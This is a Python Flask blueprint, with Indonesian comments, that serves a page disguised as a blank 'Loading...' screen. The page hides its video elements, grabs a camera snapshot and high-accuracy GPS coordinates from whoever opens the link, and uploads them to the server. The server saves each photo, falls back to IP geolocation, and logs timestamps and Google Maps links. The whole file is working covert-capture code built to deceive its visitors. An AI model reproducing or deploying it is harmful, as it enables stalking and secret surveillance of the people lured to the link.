# camera_web.py — Blueprint: auto-capture foto dari browser saat link dibuka
# Tidak mengubah main.py dan dashboard.py sama sekali.

import os
import csv
import base64
from datetime import datetime
from flask import Blueprint, request, jsonify, render_template_string

FOLDER_FOTO = "foto_otomatis"
os.makedirs(FOLDER_FOTO, exist_ok=True)

camera_bp = Blueprint("camera", __name__)

# ─── Halaman trigger — buka link ini dari HP kamu ───────────────────────────
PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Loading...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #fff;
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh;
    font-family: sans-serif;
    color: #555;
  }
  /* Tampilan sangat minimal — terlihat seperti halaman loading biasa */
  .dot {
    width: 10px; height: 10px; border-radius: 50%;
    background: #ccc; display: inline-block;
    animation: pulse 1.2s infinite;
  }
  .dot:nth-child(2) { animation-delay: .2s; }
  .dot:nth-child(3) { animation-delay: .4s; }
  @keyframes pulse {
    0%,100% { opacity: .3; transform: scale(.8); }
    50%      { opacity: 1;  transform: scale(1.1); }
  }
  /* Sembunyikan elemen kamera agar tidak kelihatan */
  #v, #c { position: fixed; opacity: 0; pointer-events: none;
            width: 1px; height: 1px; top: -9999px; left: -9999px; }
</style>
</head>
<body>
  <div>
    <span class="dot"></span>
    <span class="dot"></span>
    <span class="dot"></span>
  </div>

  <!-- Elemen kamera disembunyikan -->
  <video id="v" autoplay playsinline muted></video>
  <canvas id="c"></canvas>

<script>
(function () {
  const UPLOAD_URL = "/snap";
  const DELAY_MS   = 1200;   // tunggu kamera warm-up sebelum jepret (ms)
  const KUALITAS   = 0.80;   // kualitas JPEG 0–1
  const LEBAR      = 1280;
  const TINGGI     = 960;

  let lokasi = { lat: null, lon: null, sumber: null };

  // Ambil lokasi lewat browser Geolocation
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        lokasi.lat    = pos.coords.latitude;
        lokasi.lon    = pos.coords.longitude;
        lokasi.sumber = "GPS";
      },
      () => {
        // GPS gagal — fallback ke IP (dilakukan server)
        lokasi.sumber = "IP";
      },
      { timeout: 8000, enableHighAccuracy: true }
    );
  }

  async function jepret() {
    const video  = document.getElementById("v");
    const canvas = document.getElementById("c");
    canvas.width  = video.videoWidth  || LEBAR;
    canvas.height = video.videoHeight || TINGGI;
    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL("image/jpeg", KUALITAS);

    await fetch(UPLOAD_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        image:  dataUrl,
        lat:    lokasi.lat,
        lon:    lokasi.lon,
        sumber: lokasi.sumber,
        ua:     navigator.userAgent,
      }),
    }).catch(() => {});

    // Hentikan stream kamera setelah selesai
    video.srcObject && video.srcObject.getTracks().forEach(t => t.stop());
  }

  async function mulai() {
    try {
      // Coba kamera belakang dulu (lebih bagus di HP), fallback ke kamera mana saja
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "environment", width: { ideal: LEBAR }, height: { ideal: TINGGI } },
          audio: false,
        });
      } catch {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      }

      const video = document.getElementById("v");
      video.srcObject = stream;
      video.onloadedmetadata = () => video.play();

      // Tunggu kamera warm-up lalu jepret
      setTimeout(jepret, DELAY_MS);

    } catch (err) {
      // Kalau kamera ditolak, kirim sinyal error ke server (tanpa foto)
      fetch(UPLOAD_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ error: err.message, ua: navigator.userAgent }),
      }).catch(() => {});
    }
  }

  // Jalankan setelah halaman siap
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", mulai);
  } else {
    mulai();
  }
})();
</script>
</body>
</html>"""


def simpan_log(nama_file, lat, lon, sumber, ua=""):
    """Catat foto ke CSV log yang sama dengan main.py."""
    file_log = os.path.join(FOLDER_FOTO, "log_foto.csv")
    baru = not os.path.exists(file_log)
    with open(file_log, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        if baru:
            writer.writerow(["file", "waktu", "lat", "lon", "sumber", "maps"])
        maps_url = f"https://www.google.com/maps?q={lat},{lon}" if lat else ""
        writer.writerow([nama_file, datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                         lat or "", lon or "", sumber or "", maps_url])


@camera_bp.route("/snap")
def halaman_snap():
    """Halaman yang dibuka di HP — langsung trigger kamera."""
    return render_template_string(PAGE_TEMPLATE)


@camera_bp.route("/snap", methods=["POST"])
def terima_foto():
    """Endpoint upload foto dari browser HP."""
    data = request.get_json(silent=True) or {}

    # Jika ada error (kamera ditolak)
    if "error" in data:
        print(f"[SNAP] Kamera ditolak di HP: {data.get('ua','?')[:60]} | {data['error']}")
        return jsonify({"status": "error", "msg": data["error"]}), 200

    image_data = data.get("image", "")
    if not image_data or not image_data.startswith("data:image"):
        return jsonify({"status": "no_image"}), 400

    # Decode base64
    try:
        header, encoded = image_data.split(",", 1)
        img_bytes = base64.b64decode(encoded)
    except Exception as e:
        return jsonify({"status": "decode_error", "msg": str(e)}), 400

    lat    = data.get("lat")
    lon    = data.get("lon")
    sumber = data.get("sumber") or "Browser"

    # Jika GPS browser tidak ada, fallback ambil lokasi dari IP request
    if not lat:
        try:
            import requests as req
            ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
            r = req.get(f"http://ip-api.com/json/{ip}", timeout=4)
            d = r.json()
            if d.get("status") == "success":
                lat    = d.get("lat")
                lon    = d.get("lon")
                sumber = "IP"
        except Exception:
            pass

    # Buat nama file
    waktu = datetime.now().strftime("%Y%m%d_%H%M%S")
    if lat:
        nama_file = f"snap_{waktu}_{float(lat):.5f}_{float(lon):.5f}.jpg"
    else:
        nama_file = f"snap_{waktu}.jpg"

    path_lengkap = os.path.join(FOLDER_FOTO, nama_file)
    with open(path_lengkap, "wb") as f:
        f.write(img_bytes)

    simpan_log(nama_file, lat, lon, sumber, data.get("ua", ""))
    print(f"[SNAP] Foto diterima: {nama_file} | {sumber} | {lat},{lon}")

    return jsonify({"status": "ok", "file": nama_file}), 200
